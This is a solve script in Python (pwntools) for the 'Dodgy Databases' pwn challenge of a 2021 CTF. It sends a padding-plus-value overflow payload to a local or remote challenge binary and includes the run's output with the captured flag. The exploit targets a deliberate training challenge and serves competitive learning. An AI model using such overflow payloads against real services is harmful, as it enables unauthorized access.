from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chal'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 31267
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("Please enter a user to register: ")

buf ="A"*0x14+p32(0xbeefcafe)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Really_Awesome_CTF_2021/Pwn_Dodgy_Databases$ python solve.py r
[*] '/home/mito/CTF/Really_Awesome_CTF_2021/Pwn_Dodgy_Databases/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 193.57.159.27 on port 31267: Done
[*] Switching to interactive mode
ractf{w0w_1_w0nD3r_wH4t_free(admin)_d0e5}
'''
